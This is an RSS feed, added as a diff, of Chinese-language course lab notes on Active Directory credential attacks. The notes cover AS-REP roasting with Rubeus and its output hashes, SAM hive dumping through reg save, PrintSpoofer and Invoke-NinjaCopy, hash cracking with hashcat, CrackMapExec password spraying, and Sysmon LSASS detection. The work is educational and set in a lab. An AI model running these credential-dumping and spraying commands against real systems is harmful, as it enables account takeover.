@@ -1,0 +1,1279 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/index.xml" rel="self" type="application/rss+xml"/><item><title>NTUSTISC - AD Note - Lab(AS-REP Roasting)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/</guid><description>&lt;h1 id="ntustisc---ad-note---labas-rep-roasting">
+ NTUSTISC - AD Note - Lab(AS-REP Roasting)
+ &lt;a class="anchor" href="#ntustisc---ad-note---labas-rep-roasting">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/ubNMQ7_dcm0?si=CRVWKo4tnpx3LqxK"> 2022/05/11 AD 安全 2 &lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.tsnien.idv.tw/Security_WebBook/chap14/14-4%20Kerberos%20%E8%AA%8D%E8%AD%89%E7%B3%BB%E7%B5%B1%E7%B0%A1%E4%BB%8B.html">第十四章 Kerberos 認證系統&lt;/a>&lt;/p>
+&lt;ul>
+&lt;li>簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\to$提權$\to$橫向移動$\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分&lt;/li>
+&lt;li>提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，然後自行比對粘添壽老師的影片&lt;/li>
+&lt;li>MIT Kerberos架構：
+&lt;img src="https://www.tsnien.idv.tw/Security_WebBook/Security_%E6%8F%92%E5%9C%96/%E5%9C%96%2014-8.png" alt="" />
+為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便&lt;/li>
+&lt;li>Windows Kerberos架構：
+&lt;img src="https://hackmd.io/_uploads/BkTzOxN1T.png" alt="" />&lt;/li>
+&lt;li>優點
+&lt;blockquote>
+&lt;ul>
+&lt;li>主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。&lt;/li>
+&lt;li>客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。&lt;/li>
+&lt;li>防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。&lt;/li>
+&lt;li>防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。&lt;/li>
+&lt;/ul>&lt;/blockquote>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="as-rep-roasting">
+ ==AS-REP Roasting==
+ &lt;a class="anchor" href="#as-rep-roasting">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer
+&lt;img src="https://hackmd.io/_uploads/H1JCrlEyT.png" alt="" />
+在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket
+&lt;img src="https://hackmd.io/_uploads/BJidLxV1a.png" alt="" />
+雖然預設是不勾選，但有兩種情況會打勾
+&lt;ol>
+&lt;li>如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號)&lt;/li>
+&lt;li>因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting&lt;/li>
+&lt;li>如何攻擊：
+&lt;ul>
+&lt;li>自己把Microsoft的document看懂如何pack一個packet，然後自己實作&lt;/li>
+&lt;li>另一種方式就直接用工具&lt;a href="https://github.com/GhostPack/Rubeus/releases/tag/1.6.4">Rubeus 1.6.4&lt;/a>，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來&lt;/li>
+&lt;li>Cheat Sheet:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Rubeus.exe asreproast
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ Rubeus.exe asreproast /format:hashcat /outfile:out.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h4 id="實際執行">
+ 實際執行
+ &lt;a class="anchor" href="#%e5%af%a6%e9%9a%9b%e5%9f%b7%e8%a1%8c">#&lt;/a>
+&lt;/h4>
+&lt;ol>
+&lt;li>Using Rubeus.exe
+:::spoiler Result&lt;/li>
+&lt;/ol>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ Rubeus.exe asreproast
+
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+
+ v1.6.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain : kuma.org
+
+[*] Searching path &amp;#39;LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org&amp;#39; for AS-REP roastable users
+[*] SamAccountName : reyna.gwendolyn
+[*] DistinguishedName : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org
+[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
+[*] Building AS-REQ (w/o preauth) for: &amp;#39;kuma.org\reyna.gwendolyn&amp;#39;
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+ $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6
+ B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918
+ C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053
+ AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116
+ 934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E
+ 859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D
+ 9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9
+
+[*] SamAccountName : henrieta.sabine
+[*] DistinguishedName : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org
+[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
+[*] Building AS-REQ (w/o preauth) for: &amp;#39;kuma.org\henrieta.sabine&amp;#39;
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+ $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550
+ A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B
+ B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365
+ 68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B
+ 241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B
+ 93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E
+ CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856
+
+[*] SamAccountName : giulietta.moyra
+[*] DistinguishedName : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org
+[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
+[*] Building AS-REQ (w/o preauth) for: &amp;#39;kuma.org\giulietta.moyra&amp;#39;
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+ $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60
+ 5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C
+ 2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C
+ 1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4
+ 1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0
+ 7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297
+ 357047776932B4EA2405ECB5705418BDE7CB8DBE725BB
+&lt;/code>&lt;/pre>&lt;p>:::
+可以看到他總共吐出了三個hash，分別對應到三個使用者：&lt;font color="FF0000">reyna.gwendolyn, henrieta.sabine, henrieta.sabine&lt;/font>，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(Brute Force SAM)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/</guid><description>&lt;h1 id="ntustisc---ad-note---labbrute-force-sam">
+ NTUSTISC - AD Note - Lab(Brute Force SAM)
+ &lt;a class="anchor" href="#ntustisc---ad-note---labbrute-force-sam">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
+&lt;ul>
+&lt;li>密碼收集
+&lt;ul>
+&lt;li>SAM.hive(Security Account Manager)
+&lt;ul>
+&lt;li>What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證&lt;/li>
+&lt;li>Where: &lt;code>C:\Windows\System32\config\SAM&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Password Spraying(用猜的)&lt;/li>
+&lt;li>GPO&lt;/li>
+&lt;li>記憶體(lsass)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="brute-force-sam">
+ ==Brute Force SAM==
+ &lt;a class="anchor" href="#brute-force-sam">#&lt;/a>
+&lt;/h3>
+&lt;p>前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取
+&lt;img src="https://hackmd.io/_uploads/SyEUVnMRn.png" alt="" />&lt;/p>
+&lt;ol>
+&lt;li>匯出SAM File
+主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ reg save HKLM\SAM &amp;lt;save filename&amp;gt;
+$ reg save HKLM\SYSTEM &amp;lt;save filename&amp;gt;
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>錯誤的方式
+但經過cmd用普通權限實測會發現我們沒有這樣的資格
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ reg save HKLM\SAM SAM.dump
+錯誤: 用戶端沒有這項特殊權限。
+&lt;/code>&lt;/pre>其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file&lt;/li>
+&lt;li>正確的方式-1
+用前面提到的web shell，打出以下指令，則SAM file就會dump到&lt;code>C:\inetpub\wwwroot\sam.zip&lt;/code>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ c:\tools\PrintSpoofer64.exe -c &amp;#34;reg save HKLM\SAM C:\inetpub\wwwroot\sam&amp;#34;
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>正確的方式-2
+利用&lt;a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1&lt;/a>這個腳本，就可以複製出來，原理是使用windows的影子複製
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
+&lt;/code>&lt;/pre>但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
+:::info
+如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>解決問題
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>.&lt;span style="color:#ae81ff">\I&lt;/span>nvoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:&lt;span style="color:#ae81ff">\t&lt;/span>ools&lt;span style="color:#ae81ff">\I&lt;/span>nvoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID&lt;span style="color:#f92672">=&lt;/span>135170。
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>位於 線路:1 字元:1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ .&lt;span style="color:#ae81ff">\I&lt;/span>nvoke-NinjaCopy -Path C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\S&lt;/span>ystem32&lt;span style="color:#ae81ff">\c&lt;/span>onfig&lt;span style="color:#ae81ff">\S&lt;/span>AM -LocalDestina ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo : SecurityError: &lt;span style="color:#f92672">(&lt;/span>:&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[]&lt;/span>, PSSecurityException
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId : UnauthorizedAccess
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>解析SAM內容
+拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析
+&lt;ul>
+&lt;li>Win10 v1607之前的解法
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ samdump2 system sam 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="https://hackmd.io/_uploads/HyJXHazCn.png" alt="" />
+可以看到很多都是disabled，就代表我們要用下面的解法&lt;/li>
+&lt;li>Win10 v1607之後
+因為這個版本之後有用到AES加密，所以可以用&lt;a href="https://github.com/CiscoCXSecurity/creddump7">Creddump7&lt;/a>，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ conda activate py2.7
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ pip install pycrypto
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/CiscoCXSecurity/creddump7.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python pwdump.py system sam
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>解析Hash
+&lt;ul>
+&lt;li>方法一：用online database
+接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如&lt;a href="https://www.cmd5.com/">cmd5&lt;/a>，如果把最前面找到的&lt;code>31d6cfe0d16ae931b73c59d7e0c089c0&lt;/code>會顯示空密碼，但我們都知道是錯的
+&lt;img src="https://hackmd.io/_uploads/SkKrp6zCn.png" alt="" />
+而如果拿Creddump解析出來的&lt;code>7ecffff0c3548187607a14bad0f88bb1&lt;/code>，就可以直接顯示出我們的密碼
+&lt;img src="https://hackmd.io/_uploads/H1ZAhpz02.png" alt="" />&lt;/li>
+&lt;li>方法二：爆字典檔
+在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cp /usr/share/wordlists/rockyou.txt ./
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ hashcat -a &lt;span style="color:#ae81ff">0&lt;/span> -m &lt;span style="color:#ae81ff">1000&lt;/span> ntlm.hash rockyou.txt --force
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>31d6cfe0d16ae931b73c59d7e0c089c0: 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h1 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h1>
+&lt;div class="footnotes" role="doc-endnotes">
+&lt;hr>
+&lt;ol>
+&lt;li id="fn:1">
+&lt;p>&lt;a href="https://hackercat.org/windows/powershell-cannot-be-loaded-because-the-execution-of-scripts-is-disabled-on-this-system">PowerShell 「系統上已停用指令碼執行」解決方法&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(Password Spraying)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/</guid><description>&lt;h1 id="ntustisc---ad-note---labpassword-spraying">
+ NTUSTISC - AD Note - Lab(Password Spraying)
+ &lt;a class="anchor" href="#ntustisc---ad-note---labpassword-spraying">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>密碼收集
+&lt;ul>
+&lt;li>SAM.hive(Security Account Manager)&lt;/li>
+&lt;li>Password Spraying(用猜的)
+&lt;ul>
+&lt;li>和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來&lt;/li>
+&lt;li>Tool: &lt;a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec&lt;/a> - 結合各種功能的內網滲透神器&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>GPO&lt;/li>
+&lt;li>記憶體(lsass)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="password-spraying">
+ ==Password Spraying==
+ &lt;a class="anchor" href="#password-spraying">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>
+&lt;p>How to use?&lt;/p>
+&lt;ul>
+&lt;li>Cheat Sheet
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ crackmapexec &amp;lt;protocol&amp;gt; &amp;lt;target&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span>&amp;gt; -u &amp;lt;a file or string only&amp;gt; -p &amp;lt;a file or string only&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For example&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb &amp;lt;filename&amp;gt; -u administrator -p Passw0rd --local-auth
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;code>--local-auth&lt;/code>代表是用本機帳號的角度登入，就不是用domain admin的角度登入&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Recon Password Policy
+在PowerShell中使用&lt;code>$ Get-ADDefaultDomainPasswordPolicy&lt;/code>調查Domain上的密碼原則，Note: ==Win2016要打開==&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(偵測LSASS)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/</guid><description>&lt;h1 id="ntustisc---ad-note---lab偵測lsass">
+ NTUSTISC - AD Note - Lab(偵測LSASS)
+ &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%81%b5%e6%b8%aclsass">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
+&lt;ul>
+&lt;li>密碼收集
+&lt;ul>
+&lt;li>SAM.hive(Security Account Manager)&lt;/li>
+&lt;li>Password Spraying(用猜的)&lt;/li>
+&lt;li>GPO&lt;/li>
+&lt;li>記憶體(lsass)
+&lt;ul>
+&lt;li>How to detect LSASS access?
+利用Sysmon這個工具中有設定的event ID: 10，這個工具類似Event Viewer但更多元更強，下載可見&lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon&lt;/a>&lt;/li>
+&lt;li>How to install?
+簡單來說它需要先準備一個config file，然後安裝的時候就會一起把config設定好(每一間公司或每一個人都不一樣，算是機密)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Sysmon64.exe -i sysmonconfig-export.xml
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab">
+ Lab
